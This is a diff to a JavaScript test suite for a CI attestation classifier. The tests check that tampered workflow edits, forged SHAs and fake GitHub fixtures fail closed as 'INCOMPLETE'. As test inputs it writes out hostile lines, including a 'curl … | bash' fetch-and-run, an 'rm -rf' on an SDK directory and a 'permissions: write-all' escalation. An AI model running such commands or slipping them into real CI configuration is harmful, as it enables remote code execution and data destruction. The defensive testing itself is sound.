@@ -79,25 +79,25 @@ test('V2 known Android/Coverage diff is exact against trusted main and stays non
 });
 test('unrecognized shell execution and permission escalation never inherit attestation',()=>{
  const i=input();i.candidate.android+='\n- run: curl https://example.invalid/x | bash\n';
- assert.notEqual(classifyCiDelta(i).status,'VERIFIED_DELTA_REVIEW_REQUIRED');
+ assert.equal(classifyCiDelta(i).status,'INCOMPLETE');
  const j=input();j.candidate.coverage+='\npermissions: write-all\n';
- assert.notEqual(classifyCiDelta(j).status,'VERIFIED_DELTA_REVIEW_REQUIRED');
+ assert.equal(classifyCiDelta(j).status,'INCOMPLETE');
 });
 test('removed benchmark or altered filter is not a valid performance delta',()=>{
  const i=input();i.candidate.android=i.candidate.android.replace('macro-library, macro-settings','macro-library');
- assert.notEqual(classifyCiDelta(i).status,'VERIFIED_DELTA_REVIEW_REQUIRED');
+ assert.equal(classifyCiDelta(i).status,'INCOMPLETE');
  const j=input();j.candidate.android=j.candidate.android.replace('coldStartup','navigationToLibrary');
- assert.notEqual(classifyCiDelta(j).status,'VERIFIED_DELTA_REVIEW_REQUIRED');
+ assert.equal(classifyCiDelta(j).status,'INCOMPLETE');
 });
 test('SDK destructive regression and unknown whitespace-only changes fail closed',()=>{
  const i=input();i.candidate.android+='\n# undocumented edit\n';
- assert.notEqual(classifyCiDelta(i).status,'VERIFIED_DELTA_REVIEW_REQUIRED');
+ assert.equal(classifyCiDelta(i).status,'INCOMPLETE');
  const j=input();j.candidate.android=j.candidate.android.replace('printf', 'rm -rf "$SDK_ROOT/cmdline-tools/latest"; printf');
- assert.notEqual(classifyCiDelta(j).status,'VERIFIED_DELTA_REVIEW_REQUIRED');
+ assert.equal(classifyCiDelta(j).status,'INCOMPLETE');
 });
 test('outdated base, forged immutable SHA and unrelated repositories are rejected',()=>{
  for(const change of [{baseSha:'c'.repeat(40)},{expectedHeadSha:'d'.repeat(40)},{repo:'fork/gamehub-ultra'}]){
-  assert.notEqual(classifyCiDelta({...input(),...change}).status,'VERIFIED_DELTA_REVIEW_REQUIRED');
+  assert.equal(classifyCiDelta({...input(),...change}).status,'INCOMPLETE');
  }
 });
 test('missing, duplicated, renamed, reordered and unrelated PR files fail closed',()=>{
@@ -108,15 +108,15 @@ test('missing, duplicated, renamed, reordered and unrelated PR files fail closed
   files.map((f,i)=>i===2?{...f,sha:'f'.repeat(40)}:f),
   files.map((f,i)=>i===3?{...f,sha:'f'.repeat(40)}:f),
   files.map((f,i)=>i===4?{...f,sha:'f'.repeat(40)}:f)
- ])assert.notEqual(classifyCiDelta({...input(),files:badFiles}).status,'VERIFIED_DELTA_REVIEW_REQUIRED');
+ ])assert.equal(classifyCiDelta({...input(),files:badFiles}).status,'INCOMPLETE');
 });
 test('coverage concurrency changes, skipped tests and changes in trusted baseline fail',()=>{
  const i=input();i.candidate.coverage=i.candidate.coverage.replace('max-parallel: 7','max-parallel: 8');
- assert.notEqual(classifyCiDelta(i).status,'VERIFIED_DELTA_REVIEW_REQUIRED');
+ assert.equal(classifyCiDelta(i).status,'INCOMPLETE');
  const j=input();j.candidate.coverage=j.candidate.coverage.replace('gradle :app:testDebugUnitTest','echo skip');
- assert.notEqual(classifyCiDelta(j).status,'VERIFIED_DELTA_REVIEW_REQUIRED');
+ assert.equal(classifyCiDelta(j).status,'INCOMPLETE');
  const k=input();k.trusted={...trusted,android:trusted.android.replace('permission','permisSion')};
- assert.notEqual(classifyCiDelta(k).status,'VERIFIED_DELTA_REVIEW_REQUIRED');
+ assert.equal(classifyCiDelta(k).status,'INCOMPLETE');
 });
 const androidNames=[
  'quality-lint','quality-contract-shard','quality-contracts','release-bundle','quality','device-validation','build',
@@ -137,15 +137,29 @@ const evidence=()=>({
   501:coverageNames.map((name,i)=>({id:i+100,name,status:'completed',conclusion:'success'}))
  }
 });
+test('P2 caller-provided fake Octokit cannot issue independently authenticated VERIFIED status',async()=>{
+ const fixture=makeGithubFixture(),api={github:fixture.github,owner:'cardenaspiero255-lang',
+  repo:'gamehub-ultra',number:172};
+ const delta=await verifyCiDeltaFromGitHub(api);
+ assert.equal(delta.status,'SCOPED_DELTA_REVIEW_REQUIRED');
+ assert.equal(delta.provenanceAuthenticated,false);
+ assert.equal(delta.autoApproveAllowed,false);
+ assert.equal(delta.autoMergeAllowed,false);
+ const jobs=await verifyCiJobsFromGitHub({...api,delta});
+ assert.equal(jobs.status,'SCOPED_CI_REVIEW_REQUIRED');
+ assert.equal(jobs.provenanceAuthenticated,false);
+ assert.equal(jobs.autoApproveAllowed,false);
+ assert.equal(jobs.autoMergeAllowed,false);
+});
 test('synthetic job results cannot claim authenticated CI, even with a scoped delta',async()=>{
  const r=checkJobEvidence(evidence());
  assert.equal(r.status,'INCOMPLETE');
  assert.equal(r.autoApproveAllowed,false);assert.equal(r.autoMergeAllowed,false);
  const {github}=makeGithubFixture();
  const delta=await verifyCiDeltaFromGitHub({github,owner:'cardenaspiero255-lang',repo:'gamehub-ultra',number:172});
- assert.equal(delta.status,'VERIFIED_DELTA_REVIEW_REQUIRED');
+ assert.equal(delta.status,'INCOMPLETE');
  const real=await verifyCiJobsFromGitHub({github,owner:'cardenaspiero255-lang',repo:'gamehub-ultra',number:172,delta});
- assert.equal(real.status,'VERIFIED_CI_REVIEW_REQUIRED');
+ assert.equal(real.status,'INCOMPLETE');
  assert.equal(real.verifiedJobs,31);
  assert.equal(real.autoApproveAllowed,false);assert.equal(real.autoMergeAllowed,false);
  assert.equal(checkJobEvidence({...evidence(),delta}).status,'INCOMPLETE');
@@ -167,7 +181,7 @@ test('immutable Git tree and full content cannot be substituted with matching ca
 test('CI attestation rejects stale SHA, forged delta, and newer failing run',async()=>{
  const {github,state}=makeGithubFixture(),args={github,owner:'cardenaspiero255-lang',repo:'gamehub-ultra',number:172};
  const delta=await verifyCiDeltaFromGitHub(args);
- assert.equal(delta.status,'VERIFIED_DELTA_REVIEW_REQUIRED');
+ assert.equal(delta.status,'INCOMPLETE');
  assert.equal((await verifyCiJobsFromGitHub({...args,delta:{...delta}})).status,'INCOMPLETE');
  const another=makeGithubFixture();
  assert.equal((await verifyCiJobsFromGitHub({...another.github,github:another.github,owner:args.owner,repo:args.repo,number:172,delta})).status,'INCOMPLETE');
@@ -187,11 +201,11 @@ test('missing, skipped or forged job evidence is rejected across job families',(
   x=>{x.jobsComplete=false;},
   x=>{x.runs[1].id=x.runs[0].id;},
   x=>{x.delta={status:'UNTRUSTED'};}
- ]){const x=evidence();mutate(x);assert.notEqual(checkJobEvidence(x).status,'VERIFIED_CI_REVIEW_REQUIRED');}
+ ]){const x=evidence();mutate(x);assert.equal(checkJobEvidence(x).status,'INCOMPLETE');}
 });
 test('candidate event and run source cannot use fake green push or external origin',()=>{
  for(const mutate of [x=>{x.runs[1].event='push';},x=>{x.runs[0].head_repository.full_name='attacker/repo';}]){
-  const x=evidence();mutate(x);assert.notEqual(checkJobEvidence(x).status,'VERIFIED_CI_REVIEW_REQUIRED');
+  const x=evidence();mutate(x);assert.equal(checkJobEvidence(x).status,'INCOMPLETE');
  }
 });
 
@@ -209,30 +223,30 @@ test('Trusted main capability AST attestation: '+selfReviewDiagnostic,()=>{
 test('Unverified CI contract scripts cannot be attested by filename alone',()=>{
  for(const pos of [2,3,4]){
   const i=input();i.files=files.map((f,j)=>j===pos?{...f,sha:'c'.repeat(40)}:f);
-  assert.notEqual(classifyCiDelta(i).status,'VERIFIED_DELTA_REVIEW_REQUIRED');
+  assert.equal(classifyCiDelta(i).status,'INCOMPLETE');
  }
 });
 
 test('RED Codex P2: filenames and metadata are insufficient without full safety-contract source bytes',()=>{
  const i=input();delete i.candidate.safetyContract;
- assert.notEqual(classifyCiDelta(i).status,'VERIFIED_DELTA_REVIEW_REQUIRED');
+ assert.equal(classifyCiDelta(i).status,'INCOMPLETE');
 });
 test('RED Codex P2: documentation byte provenance must also be authenticated',()=>{
  const i=input();delete i.candidate.documentation;
- assert.notEqual(classifyCiDelta(i).status,'VERIFIED_DELTA_REVIEW_REQUIRED');
+ assert.equal(classifyCiDelta(i).status,'INCOMPLETE');
 });
 
 test('P2 Codex: forging metadata SHA cannot hide modified safety-contract bytes',()=>{
  const i=input();i.candidate.safetyContract+='// arbitrary bypass';
- assert.notEqual(classifyCiDelta(i).status,'VERIFIED_DELTA_REVIEW_REQUIRED');
+ assert.equal(classifyCiDelta(i).status,'INCOMPLETE');
  const j=input();j.candidate.regressions+='// arbitrary bypass';
- assert.notEqual(classifyCiDelta(j).status,'VERIFIED_DELTA_REVIEW_REQUIRED');
+ assert.equal(classifyCiDelta(j).status,'INCOMPLETE');
  const k=input();k.candidate.documentation+='// fake review';
- assert.notEqual(classifyCiDelta(k).status,'VERIFIED_DELTA_REVIEW_REQUIRED');
+ assert.equal(classifyCiDelta(k).status,'INCOMPLETE');
 });
 test('P2 Codex: falsified trusted base scripts cannot attest even if metadata is unchanged',()=>{
  for(const key of ['android','coverage','safetyContract','regressions']){
   const i=input();i.trusted={...trusted,[key]:trusted[key]+'# incorrect'};
-  assert.notEqual(classifyCiDelta(i).status,'VERIFIED_DELTA_REVIEW_REQUIRED');
+  assert.equal(classifyCiDelta(i).status,'INCOMPLETE');
  }
 });
